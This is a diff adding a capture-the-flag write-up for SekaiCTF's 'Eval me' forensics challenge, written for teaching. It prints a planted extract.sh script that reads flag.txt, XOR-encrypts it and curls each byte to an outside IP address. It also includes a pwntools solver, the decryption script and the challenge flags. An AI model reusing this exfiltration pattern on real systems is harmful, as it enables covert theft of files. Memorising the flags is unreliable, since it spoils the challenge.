@@ -188,3 +188,181 @@ print(flag)
 
 ### The flag
 `sekai{some1zfarawaytmr15sequeltoourdreamtdy}`
+
+## Eval me
+|   |   |
+|---|---|
+| Category: | Forensics |
+| Tools used: | Wireshark, python scripting |
+
+### Problem Statement
+
+> I was trying a beginner CTF challenge and successfully solved it. But it didn't give me the flag. Luckily I have this network capture. Can you investigate?
+
+`nc chals.sekai.team 9000`
+
+And a network capture: capture.pcapng
+
+### Initial discovery - `nc chals.sekai.team 9000`
+Connecting we see the CTF challenge that was mentioned in the problem statement. Interacting with it, we see that if we answer correctly, it says "Too slow". So clearly if we are going to solve the challenge, we are going to need to write a script to read in the equation and send back the result. But do we even have to solve this challenge? At this point, I'm not sure!
+
+![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/e8c005c3-2dda-4060-988d-baaa68bfad44)
+
+### Initial discovery - `capture.pcapng`
+Opeming the file in Wireshare, and poking around a bit, we see a bunch of HTTP packets which are POST requests with ‘data’ in the body, e.g. the first one is `{“data”: “20”}` followed by 200 responses. 
+
+![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/7eb5978f-290b-4cfe-ac20-9d2941a4c08d)
+
+If there is a trick to extracting these, I didn't figure it out, so I went through manually by timestamp and came up with:
+
+```
+20 76 20 01 78 24 45 45 46 15 00 10 00 28 4b 41 19 32 43 00 4e 41 00 0b 2d 05 42 05 2c 0b 19 32 43 2d 04 41 00 0b 2d 05 42 28 52 12 4a 1f 09 6b 4e 00 0f
+```
+
+I spent more time than I care to admit trying to turn this into something meaningful or find some other clue in the network capture.
+
+### Solving the CTF challenge within the challenge
+After failing to get anywhere else with the network capture, I decided to solve the CTF challenge. If nothing else, it would be fun. Wrote up a script that would read in the equation and send back the correct answer 100 times:
+
+```
+import json
+from pwn import *
+
+conn = remote('chals.sekai.team',9000)
+
+i = 0
+
+while i < 100:
+
+    input = str(conn.recv())
+    print(i)
+    print(input)
+
+    # regex to extract equation from input, e.g. 10 / 10 or 1 * 4
+    equation = re.findall('[\d]+ [\/\+\-\*] [\d]+', input)[0]
+
+    split_num_sym = re.findall('(\d+|[^ 0-9])', equation)
+
+    operator = split_num_sym[1]
+    first = int(split_num_sym[0])
+    second = int(split_num_sym[2])
+
+    if operator == '+':
+        result = first + second
+    elif operator == '-':
+        result = first - second
+    elif operator == '*':
+        result = first * second
+    else:
+        result = first / second
+
+    conn.sendline(str(result).encode())
+
+    i+=1
+
+response = conn.recv()
+print(response)
+
+conn.close()
+```
+
+Looping 100 times, we get correct, yay!. But no flag like the problem statement said. Now what!?
+
+![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/5b6ab66b-d7c2-4219-8561-64253d852eeb)
+
+### The twist
+But wait, scrolling up, we see something odd happened partway through the 100 times...\
+
+![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/7874b834-5223-41a3-ae1b-4f83ea06ed64)
+
+And looking in the directory, sure enough, we have a new `extract.sh` script:
+
+![image](https://github.com/amygurski/sekai-ctf-writeup/assets/49253356/81eb5759-7da2-459e-876b-c10a6ec3aafd)
+
+### `extract.sh`
+Looking at the new script, we see that it reads in some text in flag.txt and encrypts it using an `XOREncypt()` function and a KEY which we are helpfully given.
+
+It then sends an HTTP POST request to an address and with a body matching our network capture. So it's all coming together now!
+
+```
+#!/bin/bash
+
+FLAG=$(cat flag.txt)
+
+KEY='s3k@1_v3ry_w0w'
+
+
+# Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46
+Asc() { printf '%d' "'$1"; }
+
+
+XOREncrypt(){
+    local key="$1" DataIn="$2"
+    local ptr DataOut val1 val2 val3
+
+    for (( ptr=0; ptr < ${#DataIn}; ptr++ )); do
+
+        val1=$( Asc "${DataIn:$ptr:1}" )
+        val2=$( Asc "${key:$(( ptr % ${#key} )):1}" )
+
+        val3=$(( val1 ^ val2 ))
+
+        DataOut+=$(printf '%02x' "$val3")
+
+    done
+
+    for ((i=0;i<${#DataOut};i+=2)); do
+    BYTE=${DataOut:$i:2}
+    curl -m 0.5 -X POST -H "Content-Type: application/json" -d "{\"data\":\"$BYTE\"}" http://35.196.65.151:30899/ &>/dev/null
+    done
+}
+
+XOREncrypt $KEY $FLAG
+
+exit 0
+```
+
+### Decrypting the data
+We now have the encrypted data and a key, so we just need to reverse the encryption script. Or do we!?
+
+Looking at the credit URL, we see we are helpfully givem then decrption script: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46
+
+We give it our KEY and TESTSTRING and sure enough we get the flag!
+
+```
+#!/bin/bash
+
+KEY='s3k@1_v3ry_w0w'
+TESTSTRING='20762001782445454615001000284b41193243004e41000b2d0542052c0b1932432d0441000b2d05422852124a1f096b4e000f'
+
+Asc() { printf '%d' "'$1"; }
+HexToDec() { printf '%d' "0x$1"; }
+
+XORDecrypt() {
+
+    local key="$1" DataIn="$2"
+    local ptr DataOut val1 val2 val3
+
+    local ptrs
+    ptrs=0
+
+    for (( ptr=0; ptr < ${#DataIn}/2; ptr++ )); do
+
+        val1="$( HexToDec "${DataIn:$ptrs:2}" )"
+        val2=$( Asc "${key:$(( ptr % ${#key} )):1}" )
+
+        val3=$(( val1 ^ val2 ))
+
+        ptrs=$((ptrs+2))
+
+        DataOut+=$( printf \\$(printf "%o" "$val3") )
+
+    done
+    printf '%s' "$DataOut"
+}
+
+XORDecrypt $KEY $TESTSTRING #| base64 -D
+```
+
+### The flag
+`SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}`
